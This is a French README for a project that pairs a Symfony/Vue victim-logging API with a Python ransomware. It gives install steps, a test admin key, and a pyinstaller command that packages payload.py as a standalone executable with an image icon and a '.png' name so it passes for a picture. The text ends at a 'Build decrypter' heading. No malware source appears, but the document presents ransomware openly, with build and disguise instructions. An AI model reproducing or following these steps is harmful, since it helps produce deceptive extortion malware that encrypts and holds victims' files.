Virus Log Symfony/Vue Api
========================

## API
------

Prérequis
------------

* PHP 8.1.0 or higher;
* Vue 3.2.36
* Webpack-Encore 1.16

Installation
------------

```cmd
git clone https://github.com/charlottesaidi/virus_log.git
cd virus_log/
composer install
yarn install
```

Utilisation
-----

**1** Démarrer le serveur symfony avec cette commande :

```cmd
symfony serve
```

**2** Compiler le client avec Webpack:
```cmd
yarn encore dev-server
```

Accéder à l'URL donnée (<http://localhost:8000> par défaut).

**3** Utilisateurs tests :
#### admins
IP: "127.0.0.1", Clé: "!"  

[1]: https://symfony.com/doc/current/best_practices.html
[2]: https://symfony.com/doc/current/setup.html#technical-requirements
[3]: https://symfony.com/download
[4]: https://symfony.com/book

---

## Malware (Ransomware)
----------

Prérequis
---------

* Python version 3.7.9 ou supérieur
* pip version 20 ou supérieur

Installation
------------

**1** De la racine du projet, vous rendre dans le dossier "python" :
```cmd
cd python
```

**2** Installer les dépandences requise avec la commande suivante :
```cmd
pip3 install -r requirements.txt
```

**3** Dans ce dossier crée un fichier `env.py` et coller le contenu de `env.exemple.py` dans se dernier puis changer les valeurs des variables d'environnement.

---

Build le malware
----------------

**1** Exécuter le commande suivante :
```cmd
pyinstaller --onefile --icon=./image/windows_image_file_icon.png --name={le nom que vous souhaiter}.png payload.py
```

Le malware ce trouve dans le dossier `dist` :)

---


Build decrypter
---------------